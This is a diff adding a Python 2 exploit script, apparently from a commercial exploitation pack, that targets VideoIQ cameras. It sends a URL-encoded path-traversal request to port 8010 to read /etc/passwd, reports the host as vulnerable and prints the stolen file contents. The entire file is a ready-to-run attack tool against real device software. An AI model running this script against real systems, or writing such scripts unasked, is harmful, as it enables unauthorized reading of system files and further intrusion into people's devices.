@@ -1,0 +1,42 @@
+#! /usr/bin/env python2
+ 
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2017
+#
+
+###
+# STD modules
+###
+import os, sys, re
+import requests
+
+_name_   = 'd2sec_videoiq_1'
+_vendor_ = 'videoiq'
+_model_  = ['Camera']
+_vuln_   = 'Local File Disclosure Vulnerability'
+_cve_    = ''
+_ref_    = 'https://www.exploit-db.com/exploits/40284/'
+_port_   = 8010
+
+def pwnrouter(host,port=_port_):
+  try:
+    url = 'http://%s:%d/%%5C../%%5C../%%5C../%%5C../%%5C../%%5C../%%5C../%%5C../%%5C../%%5C../%%5C../etc/passwd' % (host,port)
+    response = requests.get(url)
+  except Exception, e:
+    print '[-] error : %s' % e
+    return
+  if response is None:
+    print '[+] %s not vulnerable' % host
+  elif 'HTTP ERROR 404' in response.text:
+    print '[+] %s not vulnerable' % host  
+  else:
+    print '[+] %s vulnerable' % host
+    print '[+] URL: %s\n'%url
+    print response.text
+
+
+if __name__ == "__main__":
+  pwnrouter(sys.argv[1], int(sys.argv[2]))
